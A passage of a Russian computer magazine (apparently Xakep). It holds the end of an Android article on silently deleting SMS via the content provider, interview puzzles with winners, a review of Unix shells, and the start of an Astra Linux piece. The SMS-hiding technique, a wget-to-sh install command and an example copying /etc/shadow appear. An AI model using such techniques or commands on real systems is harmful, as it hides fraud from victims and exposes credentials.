что, естественно, нас не устраивает. Попробуем это исправить.
  В основе «низкоуровневой» работы с СМС в Android предусмотрен специ-
альный источник данных — SMS Provider. По определению, источники данных
предлагают общий интерфейс для доступа к любой информации путем отде-
ления логики приложения от слоя, отвечающего за хранение данных (как пра-
вило, базы данных SQLite). Любой источник данных предоставляет интерфейс
для публикации и потребления данных, основанный на простой адресной мо-
дели URI, используя схему content://.
  В Android предусмотрено несколько стандартных источников данных, та-
кие как менеджер контактов, мультимедийное хранилище, календарь, сооб-
щения. Нас интересует стандартный источник данных «Сообщения» с URI вида
content://sms/. Для полноценной работы с ним нам необходимо еще одно раз-
решение:
Для удаления отдельных сообщений можно воспользоваться следующим под-
ходом:





Видно, что работа с источником данных напоминает работу с базой данных:
метод query подготавливает SQL-запрос вида SELECT со столбцами, пере-
данными в массиве, а delete удаляет запись с идентификатором id.
   Приведенный фрагмент удалит вообще все сообщения, присланные с но-
мера 800, как во входящих, так и в отправленных, что может быть заметно,
так как у пользователя могут храниться нужные ему сообщения с этого номе-
ра. Для более «тонкого» удаления к проверке адресата можно еще добавить
проверку времени получения или отправки СМС, взятого из поля date (формат
UNIX Time). Учти, что в отличие от упомянутого выше метода abortBroadcast,
данный способ не является потокобезопасным.
   Как ты уже, наверное, догадался, приведенный код тоже откажется работать
в Android 4.4. и выше, если приложение не выбрано для работы с СМС по умол-
чанию.

ДОБРЫЕ СМС
Может сложиться ощущение, что легитимная программа, не имеющая статуса
приложения для работы с СМС по умолчанию, не сможет работать с СМС в по-
следних версиях Android. Однако это не так. Как уже отмечалось, для получе-
ния СМС вполне подойдет системное намерение SMS_RECEIVED, а для от-
правки целесообразно использовать то самое приложение по умолчанию (в
качестве «бонуса» — никакого разрешения на отправку сообщения в манифе-
сте не требуется):





Да, в этом случае фантазия программиста существенно ограничена и требует
подтверждения пользователя, но для безопасности, на мой взгляд, это не так
уж и плохо.

РЕЗЮМЕ





                                  WWW

                                                                 Пост на форуме XDA developers

                                                               Хороший гайд по работе
                                                                             с СМС в KitKat

                                                                      Справка по App Ops


Рис. 5. Android всемогущий

В качестве защитной меры здесь можно было бы написать банальное «Всег-
да используй последнюю версию Android», но, к большому сожалению, про-
изводители смартфонов финансово не заинтересованы обновлять свои ста-
рые устройства. Так, некогда флагман Samsung Galaxy Note обновился только
до версии 4.1. Для справки на рис. 5 представлена статистика одного прило-
жения из Google Play по версиям Android. Видно, что, хотя версии 4.4 и 5.0 нахо-
дятся на первом месте, их суммарная доля составляет меньше половины всех
устройств. Так что единственный совет (актуальный на все времена, кстати):
будь внимателен и критично относись к тому, что ставишь на свой карманный
компьютер.
ПИНГ-ПОНГ
Android Debug  Bridge  (ADB) поддерживает  передачу
СМС между несколькими экземплярами эмулятора. Чтобы
отправить СМС из одного эмулятора в другой, необходи-
мо указать номер порта получателя в качестве параметра
sendTo для метода sendTextMessage. ADB автоматически
адресует сообщение соответствующему экземпляру эму-       INFO
лятора.                                                              В июньском номере
                                                                             Хакера (№ 197)
SMS VS USSD                                                            в статье «SQLite
Для подтверждения операций по банковским счетам     под микроскопом»
                                                                     Дмитрий Подкопаев
и картам вместо СМС иногда используются USSD-запро-                                                                                     рассказал,
сы. Unstructured Supplementary Service Data — сервис в се-     как работать с базой
тях GSM, предназначенный для организации интерактив-     данных сообщений,
                                                                          имея рут.ного взаимодействия между абонентом сети и сервисным
приложением в режиме передачи коротких сообщений.
Команда *100# есть не что иное, как USSD-запрос. В настоящее время Android
не имеет API для чтения ответных сообщений, что может сильно усложнить
жизнь злоумышленникам.
Кодинг





                                         Олег Парамонов
                                Юрий «yurembo» Язев
                                                   yazevsoft@gmail.com,
                                                        yazevsoft.blogspot.ru
  ЗАДАЧИ
     НА СОБЕСЕДОВАНИЯХ



         ЗАДАЧИ ОТ СЕРВИСА
   МОБИЛЬНОГО ЭКВАЙРИНГА PAY-ME
     И ПРОСЛАВЛЕНИЕ ПОБЕДИТЕЛЕЙ
              ОТ ACRONIS
В этом выпуске мы расскажем, как отбирают
кандидатов в сервис мобильного эквайринга Pay-Me.
Передаю слово Игорю Аскарову — техническому
директору Pay-Me. Он поделится задачами,
которые он дает на собеседованиях при приеме
разработчиков в команду.

Наше решение находится на стыке финансовых и мобильных технологий, оно
позволяет принимать оплату картами при помощи картридера и мобильного
приложения, поэтому нам важно, чтобы технический специалист имел опыт
работы в банковской сфере или представление, как устроена платежная ин-
дустрия изнутри. Мы задаем вопросы на знание предметной области, а также
в зависимости от навыков, указанных в резюме кандидата, спрашиваем, на-
пример: «Что такое индекс в реляционной БД (как структура данных)? Зачем
нужен индекс в реляционной БД? Какие вы знаете алгоритмы сортировки дан-
ных? Какие отличия были введены в протоколе HTTP версии 1.1?»
   Хочешь попробовать свои силы? Вот примеры задач, решить которые могут
попросить на встрече в компании.

ЗАДАЧА 1
Два робота десантируются на бесконечно длинную линию (ось) в произвольных
ее точках, после посадки роботы смотрят в одну и ту же сторону относительно
оси. Роботам неизвестно расположение относительно друг друга. После при-
земления они сбрасывают свои парашюты на месте посадки. В оба робота пе-
ред посадкой заложена одна и та же программа, которая может состоять из
нескольких команд:

step_left (шаг влево)
step_right (шаг вправо)
goto N (переход на строку программы с номером N)
goto_p N (переход на строку программы с номером N при условии наличия
парашюта в месте нахождения робота. Парашют может быть как свой, так
и другого робота)

Выполнение любой команды занимает один условный такт, равный одной се-
кунде. Нужно составить программу, которая гарантированно позволит роботам
встретиться на бесконечной оси.
ЗАДАЧА 2
В барабан шестизарядного револьвера зарядили две пули подряд. Перекрути-
ли барабан, навели на вас и нажали на курок. Выстрела не произошло. Теперь
вам предлагают выбор: либо стреляющий сразу нажмет на курок еще раз, либо
сначала опять перекрутит барабан. Что вы выберите, если хотите жить?

ЗАДАЧА 3
Амеба в воде размножается со скоростью одна амеба в минуту. Если поме-
стить амебу в трехлитровый баллон, то он заполнится за час. Через какое вре-
мя баллон заполнится, если поместить туда две амебы?




   КУДА СЛАТЬ ПРАВИЛЬНЫЕ ОТВЕТЫ?
    Правильные ответы можно присылать на почту: elavrova@pay-me.ru.
       Первому, кто правильно решит все задачи, мы вручим приятный
    приз от компании — дисконтную карту, которая дает скидку 50% на
     покупку картридера, за второе и третье место вручим карты на скидку
   35% и 20% соответственно (подробнее).


РЕШЕНИЕ ЗАДАЧ ОТ КОМПАНИИ ACRONIS
ПО ВЕРСИИ ПОБЕДИТЕЛЯ

ЗАДАНИЕ 1. ЧАСЫ
Будет верно, только когда минутная и часовая стрелки совпадают. Такое про-
исходит раз в час на двенадцатичасовом циферблате, значит, всего 22 раза в
сутки, если считать с отметки 00:00.

ЗАДАНИЕ 2. ЧИСЛО НА БУМАГЕ
Решается очень просто. Надо лишь согнуть бумагу между клетками чисел и от-
правной точкой круга. Используя 3d пространство мы сначала убираем рас-
стояние между цифрами, добавляя его после каждой законченной цифры, рас-
правляя бумагу.
ИТАК, КТО У НАС СЕГОДНЯ?
(открываю конверт, очень волнуюсь).

Иннокентий Сенновский
... Иннокентий Сенновский?! Этот матерый человечище
не в первый раз щелкает наши задачки, надо бы его уже
забанить :). Ладно-ладно, шучу. На самом деле, он крутой специалист
и работает в серьезном месте (когда он решил задачки от Яндекса, со-
беседование его не заинтересовало ;)) и всем нам очень приятно, что
среди наших читателей есть такие профессионалы.

Короля нашей сегодняшней задачко-вечеринки мы выбрали, а кто же
королева? А вот она!

Овчинникова Анна — внезапно, сотрудник Acronis, но участвовала
она на общих основаниях. Респект!

Победители быстро закончились, а я вот только раскачался :). Поэто-
му вот что: выскажу респект тем, кто не победил, но старался. Вот эти
парни, они решили правильно только одну задачу: Семёнов Никита,
Вячеслав Смирнов, Николай Савченков, Александр Кормушкин,
Sergey Mashoshin, Сергей Романов, Михаил, Чащин Виктор.





Наша читательница Мария решает задачу оффлайн-методами :)
IT-КОМПАНИИ, ШЛИТЕ НАМ СВОИ ЗАДАЧКИ!

Миссия этой мини-рубрики — образовательная, поэтому мы бес-
платно публикуем качественные задачки, которые различные компа-
нии предлагают соискателям. Вы шлете задачки на lozovsky@glc.ru —
мы их публикуем. Никаких актов, договоров, экспертиз и отчетностей.
Читателям — задачки, решателям — подарки, вам — респект от на-
шей многосоттысячной аудитории, пиарщикам — строчки отчетности
по публикациям в топовом компьютерном журнале.
СЕНСАЦИЯ!
КОРОЛЬ СВЕРГНУТ!
Выбран новый победитель                                    Александр Лозовский
в «Задачах на собеседование»


Не так давно, в 198-ом выпуске задачек на собеседованиях (https://xakep.
ru/2015/07/07/coding-challenges-198/) ребята из Acronis предложили нашим чи-
тателям решить несложную задачку:

   Представьте, что у вас есть обыкновенные часы. Они идут точно,
без сбоев. В этих часах меняют местами минутную и часовую стрелки.
Сколько раз в сутки такие часы будут показывать правильное время?

   Оказалось, что в процессе подведениях итогов мы с товарищами из Acronis
капитально проглючили, перепутав 22 и 24, благодаря чему Иннокентий Сен-
новский был выбран победителем необоснованно. Отвечал он неплохо, но
верный ответ на первую задачу все-таки 22: часы будут показывать правильно
время 22 раза за сутки. Это будет происходить тогда, когда стрелки часов (ми-
нутная и часовая) совпадают на циферблате).
   Поэтому вот новый король нашей сегодняшней задачко-вечеринки: Михаил!
Он получает ключик для Acronis TrueImage 2016 – анлимит на целый год.

КОММЕНТАРИЙ ВЕНДОРА
В первой задаче сознательно не давалось указаний, в какой момент времени
происходит замена стрелок. Так как, если сделать это в любой время, отлич-
ное от момента, когда положение стрелок совпадает, то верного времени мы
не получим. Поэтому, чтобы было интереснее, нужно это сделать тогда, когда
положение стрелок совпадает. Дальше верное время получаем только тогда,
когда положение стрелок тоже будет совпадать, что будет происходить каждые
1 час и 5 минут. За 24 часа получаем 22 таких совпадения, что и будет правиль-
ным ответом.
                      — Евгений Панищев, Acronis
 UNIXOID
*SH, ФАС!
 ОБЗОР АЛЬТЕРНАТИВНЫХ CLI-ОБОЛОЧЕК





 *nix-системы всегда были сильны своей командной стро-
 кой. Большинство, однако, пользуется исключительно
 bash, поскольку, как правило, в дистрибутивах его ставят
 по умолчанию, на иные же переключаться попросту лень.
 В то же время неплохо бы получить представление об их
 возможностях, чем мы и займемся в статье.
                                      Роман Ярыженко
                                                rommanio@yandex.ru



ВВЕДЕНИЕ
Во времена MS DOS единственной оболочкой был крайне примитивный (как,
впрочем, и весь DOS) COMMAND.COM. Именно из-за своей простоты он на-
чал обрастать двухпанельными файловыми менеджерами, идея которых за-
тем была подхвачена и в POSIX-системах. Многие из тех отечественных поль-
зователей, кто говорит, что работает в командной строке, на самом деле
работают в mc — как раз из-за того, что COMMAND.COM когда-то был прими-
тивным. Однако в *nix-системах оболочки были не столь незатейливы, как в DOS.
Таким образом, параллельно парадигме двухпанельных файловых менедже-
ров, привнесенной в *nix фактически извне, развивалась (и развивается) па-
радигма, «родная» для этих систем, а именно — «чистая» консоль с какой-ли-
бо из оболочек, которых существует немало. С учетом их многообразия
проблема выбора оболочки в случае, если стандартная (bash) чем-то не устра-
ивает, может стать достаточно острой. В статье будут рассмотрены следую-
щие оболочки:
• dash — прямой наследник NetBSD-версии ash — оболоч-
   ки Альмквиста, которая крайне строго соответствует стан-
   дартам и за их пределы не выходит, из-за чего никаких иных
   возможностей в ней не предусмотрено;
•  tcsh — оболочка, входящая в состав FreeBSD-base, име-
   ет синтаксис, близкий к синтаксису C, что, таким образом,                                    WWW
   делает ее несовместимой с системными скриптами;
• ksh — оболочка, похожая на оболочку Борна с некоторы-       Стандарт
                                                                              POSIX  ми возможностями csh, почти полностью соответствует                                                                            по оболочкам
   стандартам POSIX;
•  zsh — оболочка с очень гибкими параметрами, позволяет        Более
                                                                                поздняя   настраивать буквально все;
                                                                                 версия
•  fish — симпатичная оболочка, «поставил и забыл».                                                                                  стандарта

Каждая оболочка будет оценена по десятибалльной шкале
по нескольким критериям: это простота использования, функ-
циональность и скорость.
DASH
 Простота использования: 4
 Функциональность:     6
 Скорость:             10

Де-факто это самая маленькая из оболочек, при запуске в виртуальной па-
мяти она занимает примерно 4 Мбайт (сравни с 31 у bash). Если же говорить
о размере исключительно исполняемой части виртуальной памяти, то dash за-
нимает 112 Кбайт (bash — 968 Кбайт). Однако dash до такой степени строго со-
ответствует стандарту POSIX, что напрочь игнорирует все появившиеся с тех
пор новшества и некоторые удобные вещи в синтаксисе, а это может привести
к проблемам при написании скриптов. В отдельных дистрибутивах в качестве
системной оболочки используется bash, поведение которой даже в режиме
совместимости с sh не всегда сходится с dash.
  Прежде всего необходимо заметить, что dash почти полностью неинтерак-
тивна. Отсутствует автодополнение, история, и даже возможность поменять
приглашение командной строки ограничена исключительно статическим тек-
стом. Таким образом, данная оболочка не особо предназначена для примене-
ния в качестве пользовательской.
  В случае же со скриптами возникает казус. С одной стороны, dash под-
держивает только то, что определено в стандарте, который писался довольно
давно, следовательно, команд там меньше и синтаксис должен быть проще.
С другой же — возникает одно «но» под названием «синтаксический сахар».
Этого самого сахара в bash достаточно. Кроме синтаксического сахара (с от-
сутствием которого в dash еще можно как-то смириться), огромная проблема
возникает и с массивами — в описываемой оболочке их нет. Вообще.
  Посмотрим теперь, что из синтаксического сахара отсутствует в dash и чем
предлагается это заменить. Оператор test, он же [, не поддерживает == (опе-
ратор сравнения в стиле С), вместо него нужно использовать просто =. Кроме
того, крайне не рекомендуется использовать опции -a и -o. Стоит привести
гипотетический пример. Вместо строчки

[ \( “$foo” == “$bar” -a -f /tmp/baz \) -o ! -x /bin/su ]

необходимо использовать строчку

(([ “$foo” = “$bar” ] && [ -f /tmp/baz ]) || [ ! -x /bin/su ])

Отсутствует также и оператор [[, позволяющий в некоторых случаях писать
скрипты более естественно, нежели при использовании одинарной квадрат-
ной скобки. Приходится извращаться с экранированием.
  Операции инкремента и декремента в стиле С (++ и --) также не поддержи-
ваются.
  Не поддерживаются и такие выражения, как  $’’, $»»,  ${}, переменные
$LINENO, $RANDOM и некоторые еще, вместо echo рекомендуется использо-
вать printf, let тоже отсутствует.
  А что у нас со скоростью работы? Я решил провести синтетический бенч-
марк. Было опробовано несколько вариантов, но в итоге остановился на сле-
дующем, поскольку в нем используются только встроенные функции оболочки:

$ /usr/bin/time dash -c ‘i=0 ; while [ “$i” -lt 10000000 ];
   do [ “$1” = “123” ] && echo ok ; i=$(($i+1)) ; done’

И вот тут dash удивляет. Она выполнила этот цикл за 40 с, в то время как bash —
за 2 мин 17 с.
   Резюме: dash не предназначена ни для интерактивного использования,
ни для написания сложных скриптов. Точнее, писать-то можно, но без синтак-
сического сахара скрипты будут выглядеть чересчур запутанно. Зато по ско-
рости она более чем в три раза быстрее bash (это, однако, не означает, что
разработчик может писать скрипты, как ему заблагорассудится, — скорее уж
наоборот). Кроме того, она реально маленькая — для настольных систем это
сейчас не особо актуально, конечно, но для встраиваемых может оказаться
большим плюсом.


TCSH
 Простота использования: 8
 Функциональность:     7
 Скорость:             5

Данная оболочка занимает в памяти чуть меньше места, чем bash, — примерно
29 Мбайт. Именно здесь появилось автодополнение. Посмотрим, что же тут есть
такого, чего нет в bash. Во-первых, очень удобная история. Если в bash для авто-
дополнения какой-либо команды на букву w из истории команд нужно было на-
жать более пяти клавиш, то в tcsh для этого нужно набрать !w и нажать клави-
шу табуляции. И дальше уже сработает автодополнение. Кроме того, при наборе
первых букв команды, сохраненной в истории, можно листать все остальные ко-
манды, которые на эти буквы начинаются. Во-вторых, автодополнение тут само
по себе работает прекрасно. Оно показывает все варианты дополнения по одно-
му нажатию Tab (а не по двум, как это сделано в bash), и, кроме того, в конце имен
каталогов автоматически (после первого нажатия на Tab) ставится слеш — в не-
которых версиях bash он ставится только после второго; впрочем, в последней
версии Xubuntu поведение идентично. Есть, к сожалению, у автодополнения в tcsh
и недостатки. Так, если команда многострочная, помнится только первая строка.
   Отдельно стоит упомянуть и функцию коррекции ошибочно набранных ко-
манд, работающую на удивление безупречно, особенно при использовании
достаточно длинных команд. Должен, однако, заметить, что исправляет авто-
коррекция только одну ошибку, чего, впрочем, в общем случае достаточно.
   Комбинации клавиш по умолчанию Emacs, но можно поставить и vi (bindkey
-v), а то и вовсе назначить свои.
   Конфигурационный файл называется .tcshrc и может включать в себя иные
файлы — для этого применяется команда source. Для совместимости пред-
лагается и файл .cshrc, но на практике им сейчас никто не пользуется. Кроме
того, как и у большинства современных оболочек, существует сторонний про-
ект tcshrc, предоставляющий удобный набор конфигов, чтобы не писать их са-
мому. Загрузить его можно с sourceforge.net.

                                                                              Tcsh
                                                                                  с гото-
                                                              вым
                                                                       конфи-
                                                                         гом





Синтаксис скриптового языка несовместим со стандартом POSIX. Так, на-
прочь отсутствует возможность создавать функции, что очень ограничивает
применение оболочки для неинтерактивных действий. Вместо for использует-
ся foreach. Также сильно ограничена поддержка однострочников, для их напи-
сания требуется использовать printf, что, мягко скажем, не слишком удобно.
   Попытаемся измерить скорость данной оболочки, для чего адаптируем
к ней бенчмарк:

#!/bin/tcsh
set i = 0
while ($i < 10000000)
    if ($1 == “123”) then
        echo ok
    endif
    @ i = $i + 1
end
Результаты крайне огорчают: скрипт выполнялся 7 мин 45 с, что более чем
втрое превышает время выполнения аналогичного скрипта в bash.
   Резюме: данная оболочка удобна для интерактивного пользования, на-
страиваема, гибка... но для написания скриптов непригодна в первую очередь
из-за того, что практически полностью несовместима с POSIX. Плюс, по-ви-
димому, разработчики здраво рассудили, что скрипты для нее писать никто
не будет, следовательно, можно сильно не оптимизировать в плане скорости.


KSH
 Простота использования: 7
 Функциональность:      8
 Скорость:             7

Общий объем виртуальной памяти, занимаемой ksh, составил приблизительно
22 Мбайт, из которых целых 1400 Кбайт занимает секция кода (если быть пе-
дантичным — секция .text ELF-файла). С точки зрения интерактивного исполь-
зования данная оболочка отличается от bash тем, что по умолчанию использует
режим Vi. Ну а главное отличие, пожалуй, связано с работой с каналами: в bash
для выполнения второй команды запускается дочерняя оболочка, а в ksh она ис-
полняется в той же самой оболочке. Например, выполнение следующих команд:

$ echo test | read variable
$ echo $variable

в ksh выведет test, в bash же ничего (в последних версиях bash, впрочем, появи-
лась возможность задать аналогичное поведение с помощью опции lastpipe).
Также несколько отличается работа с заданиями. Если в остальных оболочках
для перевода задания в фоновый режим после нажатия комбинации <Ctrl +
Z> используется команда bg 1, то в ksh — bg %1, что может вызвать некоторый
дискомфорт у пользователей. Для повтора предыдущей команды применяет-
ся команда r. Могут возникнуть и проблемы с привязкой клавиш, хоть оболочка
и поддерживает эту функциональность, но, по-видимому, имеются некоторые
ограничения; таким образом, в данном отношении ksh проигрывает bash.
  А вот в плане написания скриптов у ksh возможностей самую малость
больше, чем у bash. В частности, имеется возможность определять глобаль-
ные функции, задавать пространства имен для переменных, переопределять
действия при получении значения переменной и/или при его занесении, соз-
давать ассоциативные массивы и выполнять операции с плавающей точкой.
Поддерживается даже некий аналог ООП (через typeset -T). Имеется также
компилятор во встроенный байт-код, который, к слову, нигде толком не описан.
  В быстродействии по показаниям бенчмарка эта оболочка практически
сравнялась с dash, а то и превосходит последнюю — в некоторых случаях вре-
мя выполнения примерно на три секунды меньше.

                                                                  Пример
                                                                          скрипта
                                                                                    ksh,
                                                                        использую-
                                                                    щего
                                                                      возможно-
                                                                            сти ООП





Резюме: ksh для интерактивного использования, быть может, менее удобна
и настраиваема, чем bash (особенно современных версий), но по скриптово-
му языку и скорости его превосходит.


ZSH
 Простота использования: 9
 Функциональность:     9
 Скорость:             8

Данная оболочка в ненастроенном состоянии отбирает примерно 47,5 Мбайт
виртуальной памяти, из которых исполняемого кода собственно zsh 680 Кбайт.
При первом запуске появляется текстовый мастер настройки, с помощью ко-
торого можно настроить отдельные возможности zsh, такие как история и ав-
тодополнение. Подобного не делает ни одна из описанных ранее оболочек.
Следовательно, можно ожидать, что эта оболочка чем-то лучше.
Начальная
настройка
zsh





Первый
запуск zsh
после
настройки
Рассматривать процесс настройки я не буду, отмечу лишь, что во время него
сразу обращает на себя внимание обилие опций, относящихся к автодопол-
нению. Посмотрим, как все это работает и насколько эти ожидания оправдан-
ны. Чтобы не мучиться с настройками, можно установить набор конфигов oh-
my-zsh, для чего следует набрать следующую команду (должен стоять Git, так
как он используется при загрузке):

$ sh -c “$(wget https://raw.github.com/robbyrussell/oh-my-zsh/
   master/tools/install.sh -O -)”

Первое, что бросается в глаза при запуске zsh с установленным oh-my-zsh
и конфигом по умолчанию, — расцветка приглашения. Расцветка выбрана
не от балды — каждый цвет что-то означает. Так, при ненулевом коде возврата
стрелочка из зеленой становится красной, а при наличии в текущем каталоге
подкаталога .git показывается текущий бранч. Однако расцветка приглашения
командной строки — отнюдь не самая важная особенность zsh, поэтому пере-
йдем к автодополнению.

                                                                         Zsh с oh-my-
                                                                                        zsh. Видно,
                                                                              что пре-
                                                                 дыдущая
                                                                      команда
                                                                         вернула не-
                                                                         нулевой код
                                                                           возврата
                                                                         Пригла-
                                                                 шение zsh
                                                                          в git-репо-
                                                                         зитории





Автодополнение в zsh сделано на высочайшем уровне. При должной конфи-
гурации (либо установленном oh-my-zsh или любом другом конфиге, которых
достаточно на любой вкус) по нажатию на <Tab> дополняются даже иденти-
фикаторы процессов при использовании команды kill. Кроме того, для боль-
шинства команд по нажатию на данную клавишу можно просматривать спи-
сок опций, что в некоторых случаях избавляет от необходимости лезть в man.
Есть также коррекция опечаток при автодополнении (не путать с обычной ав-
токоррекцией), позволяющая задавать максимальное количество ошибок,
при котором оно произойдет. Более того! Оболочка позволяет использовать
сокращения в путях — главное, чтобы путь был уникальный. Например, путь
/v/l/dm раскроется (опять же по нажатию клавиши автодополнения) в /var/
log/dmesg.
  Еще одна полезная возможность — глобальные псевдонимы. Проще всего
их рассмотреть на примере. Зададим следующие псевдонимы:

zsh$ alias -g L=’| less’
zsh$ alias -g G=’| grep’

Теперь наберем команду

zsh$ apt-cache search linux G lowlatency L
При выполнении zsh раскроет эту команду, и без набора лишних букв мы от-
фильтруем все low latency ядра, выведя их список с помощью less.

                                                                        Исполь-
                                                                         зование
                                                                        глобальных
                                                                         псевдони-
                                                                    мов в zsh





Есть также псевдонимы расширений, которые позволяют открыть файл с ка-
ким-то расширением, просто набрав его имя в командной строке, — при этом
запускается заданная в псевдониме команда. Автокоррекция? И она тоже
предлагается — возможности аналогичны tcsh.
  В смысле же написания скриптов и расширения функциональности zsh пре-
доставляет отличный набор возможностей, в том числе режимы совместимо-
сти с sh, csh и ksh, операции с плавающей точкой (как и в ksh) и даже сетевые
функции (в том числе сокеты), реализованные с помощью загружаемых моду-
лей zsh, — имеется написанный таким образом скрипт HTTP-сервера.
   Бенчмарк выполнился примерно за 1 мин 14 с, что в сочетании с мощно-
стью данной оболочки выглядит очень неплохим результатом.
   Резюме: оболочка очень удачна как в качестве интерактивной, так и в каче-
стве средства для написания скриптов. Могут возникнуть некоторые сложно-
сти с настройкой, но их легко решить, используя готовые файлы конфигурации.
FISH
 Простота использования: 8
 Функциональность:     5
 Скорость:             N/A

Данная оболочка появилась в 2005 году, поэтому она базируется на несколько
иных принципах, чем уже описанные оболочки. В частности, для сохранения
переменных используется демон fishd, который стартует при запуске перво-
го экземпляра fish данного пользователя. Fish занимает приблизительно 45,5
Мбайт виртуальной памяти, fishd — 26 Мбайт, что в итоге дает общий объем
больший, чем у любой другой описанной оболочки.
  При запуске появляется приглашение командной строки с краткой инфор-
мацией о том, как получить справку. При наборе первых букв высвечивается
подсказка с возможным окончанием команды, выделенным серым цветом.
При наборе двух букв и нажатии на Tab появляется список команд с крат-
кой информацией по ним (время от времени нужно обновлять с помощью
fish_update_completions). По команде help с помощью xdg-open будет запу-
щен браузер. Попытка выполнить эту команду в текстовом режиме успехом
не завершилась — помимо того что она не смогла найти нужный дисплей,
сперва не вышло найти links/lynx, а после их установки справка все равно
не отобразилась.

                                                                        Подсказка
                                                                      при наборе
                                                                   команды
                                                                          в fish
                                                                        Краткое
                                                                        описание
                                                                      команд
                                                                      при автодо-
                                                                      полнении





Для настройки fish есть два пути. Первый — настроить его вручную с помощью
любимого текстового редактора (или скачать аналог oh-my-zsh для fish, кото-
рый, к слову, и называется почти так же — oh-my-fish). Второй — использовать
команду fish_config, которая запустит встроенный веб-сервер и отобразит
страницу настройки в браузере. В теории последний вариант выглядит пред-
почтительным для новых пользователей. На практике же... после запуска этой
команды браузер, конечно, открылся — но сделать в нем ничего нельзя было
из-за отсутствия jquery.js. Возможно, проблема кроется в дистрибутиве — я
использовал fish из репозиториев Ubuntu 15.04 (в CentOS 7 и Debian 8 такой
пакет отсутствует).
  О плюсах — помимо подсветки команд и их аргументов разным цветом, есть
еще удобное перенаправление вывода, которое требует чуть меньше нажатий
на клавиатуру. Например, следующая команда перенаправляет как стандарт-
ный вывод, так и вывод ошибок в файл test:

fish$ cat /etc/passwd /etc/shadow > test ^&1

Еще имеется история аргументов. Допустим, если нужно после пинга запу-
стить traceroute на тот же адрес, набираем traceroute и жмем <Alt + стрелка
вверх>. Оп — и появился введенный ранее адрес.
                                                                         Веб-ин-
                                                                        терфейс
                                                                         настройки
                                                                                                 fish





В смысле написания скриптов данная оболочка не совместима ни с какой дру-
гой. Так, для присвоения значений используется синтаксис set var 0 (анало-
гично var=0), вместо операторов && и || — and и or, вместо обратных кавычек
или синтаксиса $() для выполнения результатов команды — обычные скобки,
циклы имеют иной синтаксис... Конечно, синтаксис это довольно сильно упро-
щает, но итогом становится непортируемость скриптов.
   Быстродействие оценить я не смог из-за банального отсутствия в fish встро-
енной арифметики. Есть команда math, но она вызывает bc, что для тестирова-
ния не подходит. Я все же попытался, однако скрипт выполнялся крайне мед-
ленно и стандартное для данного бенчмарка количество операций не смог
выполнить даже за час.
   Резюме: оболочка заточена под десктоп-ориентированного новичка. Под-
светка команд и аргументов, мини-справка по этим командам, веб-интер-
фейс встроенной справки и конфигурирования. Однако для применения в чи-
стой консоли и на серверах fish не подходит. Кроме того, несовместимость
с остальными оболочками делает ее еще менее пригодной для классической
работы.
oh shell

Базовая часть оболочки oh написана на Go. Синтаксис же представляет собой
сильно модифицированный Scheme, усовершенствованный с целью поддерж-
ки объектов первого класса и хвостовой рекурсии. Как и ранние реализации
Scheme, oh рассматривает любую сущность в качестве объекта первого клас-
са, что позволяет построить достаточно мощный заменитель ООП.
   Также, поскольку интерпретатор oh написана на Go, он поддерживает па-
раллелизм с помощью каналов, которые опять же являются объектами перво-
го класса. Поскольку oh использует один и тот же синтаксис как для кода, так
и для данных, каналы и пайпы зачастую взаимозаменяемы. Oh также поддер-
живает саморасширяемость — большая часть oh написана на самом oh.
  Данную оболочку можно найти на гитхабе.



ЗАКЛЮЧЕНИЕ
Несмотря на обилие графических интерфейсов и языков программирования,
оболочки по-прежнему применяются в обиходе системных администраторов
и в недрах *nix-систем в целом. Выбор, однако, как явственно показывается
в статье, достаточно большой и зависит от нужд пользователя.
   Если необходима оболочка с мощным потенциалом в плане написания
скриптов, можно посоветовать ksh — она совместима с sh, но поддерживает
в том числе зачатки ООП. Правда, для нормального программирования луч-
ше все же использовать инструменты, для этого предназначенные. Если нужна
оболочка с «красивостями» наподобие подсветки команд и веб-интерфейса
для настройки, на эту роль более всего подходит fish. Стоит, однако, учесть, что
синтаксис ее ни с чем не совместим. Если же необходима скорость скриптов —
в этом случае обрати внимание на крайне быструю dash (недаром эту оболоч-
ку выбрали в качестве системной в Ubuntu). Одна незадача — dash совершен-
но не подходит для интерактивного использования. Ну а если хочется просто
с удобством работать, то тут имеются два варианта: tcsh и zsh. Первая опять же
несовместима в плане написания скриптов с иными и достаточно медленна,
но в ней по историческим причинам автодополнение очень развито. Zsh же мо-
жет эмулировать как csh, так и старые версии ksh, при этом обладая уникальны-
ми возможностями автодополнения и настройки строки приглашения.
   Выбрать есть из чего, не так ли?
UNIXOID
    РУССКИЙ
БРОНИРОВАННЫЙ
DEBIAN


 КАК УСТРОЕНА НОВАЯ МОДЕЛЬ УПРАВЛЕНИЯ
      ДОСТУПОМ В ASTRA LINUX SE





                                          Евгений Лебеденко
                                                 DearDiaryLJ@gmail.com
От редакции:

Россия, как известно, — родина слонов. А также ракетных комплексов, подво-
дных лодок, танков и, как оказалось, не менее бронированных операционных
систем. Если ты рубишь в ИБ и живешь в России, то это как раз тот вид воору-
жений, которым ты можешь интересоваться и даже гордиться. Astra Linux SE
— одна из таких ОС. Наш автор Евгений Лебеденко — специалист по таким
системам, так что приготовься к рассмотрению безопасности в Linux с макси-
мально серьезной стороны!



Операционные системы сегодня — это не просто набор служебных функций,
который позволяет компьютеру работать. Операционки стали играть огром-
ную роль в мире потребительской электроники: Microsoft приспосабливает
Windows для всех возможных устройств, Apple экспериментирует с интерфей-
сом мобильных и десктопных систем, Google развивает Android и одновремен-
но превращает в операционную систему Chrome.
  В корпоративной среде прогресс ОС тоже идет по полной: программ-
но-конфигурируемые сети (SDN), виртуальные серверы, глобальные и част-
ные облака. Здесь на первый план выходит не юзабилити, а защищенность
и соответствие жестким требованиям к безопасности.
   Есть и еще одна область, в которой защита превыше всего, — это ОС для го-
сударственных и военных нужд. Это еще один параллельный мир операци-
онных систем — безумно консервативный, но и в нем существует прогресс.
Причем не только за рубежом, но и у нас. Показательный пример — это дис-
трибутив Astra Linux SE.

ПЯТЬ ЛЕТ. ПОЛЕТ НОРМАЛЬНЫЙ
Astra Linux — не единственный российский защищенный дистрибутив. Есть
и другие, и все они успешно прошли проверку в органах сертификации и на-
шли свои рыночные ниши. Детище НПО «РусБИТех» — не исключение. Astra
Linux SE с завидной регулярностью получает сертификаты соответствия в си-
стемах сертификации ФСТЭК, Министерства обороны и ФСБ. Действующие
на настоящий момент версии имеют «срок годности» до 2018 года.
  На основе Astra Linux развернуты и функционируют десятки информацион-
ных систем — как в государственных, так и в коммерческих структурах. Среди
них, например, такие крупные, как защищенная платформа для государствен-
ной автоматизированной системы гособоронзаказа.
В составе дистрибутива Astra Linux SE есть все необходимое,
